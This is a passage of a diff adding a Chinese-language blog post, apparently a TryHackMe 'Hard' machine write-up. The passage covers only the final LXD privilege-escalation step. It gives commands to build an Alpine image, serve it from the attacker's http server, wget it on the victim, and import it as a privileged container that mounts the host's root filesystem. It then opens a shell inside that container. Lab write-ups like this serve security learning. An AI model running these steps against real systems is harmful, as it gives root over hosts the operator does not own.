+<h4 id="lxd-exploit"><a href="#lxd-exploit" class="headerlink" title="lxd exploit"></a>lxd exploit</h4><p>Linpeas進去看到lxd權限有開<br><img src="https://hackmd.io/_uploads/BkBldptVC.png" alt="image"><br>開打 :D<br><a href="https://github.com/samoN1k0la/LXD-Privilege-Escalation">Reference : samoN1k0la@github</a><br>攻擊者端(需要root權限)：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rJZnupKVR.png" alt="image"><br>開 http server  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7777</span><br></pre></td></tr></table></figure>
+<p><strong>Victim 端</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget 10.9.195.189:7777/alpine-v3.20-x86_64-20240602_1718.tar.gz</span><br><span class="line">lxc image import alpine-v3.20-x86_64-20240602_1718.tar.gz --<span class="built_in">alias</span> thesysrat</span><br><span class="line">lxc image list</span><br><span class="line">lxc init thesysrat ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br></pre></td></tr></table></figure>
+<p>整個機器就被送進去 <code>/mnt/root</code> 的路徑咯~<br><img src="https://hackmd.io/_uploads/H1wzYpYNC.png" alt="image"><br>hehe  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>好欸又一台 Hard，練了很多技巧<br>不過建議某人不要耍白目了👊  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
+        <tag>lxd</tag>
+        <tag>routingtableparser</tag>
       </tags>
   </entry>
   <entry>
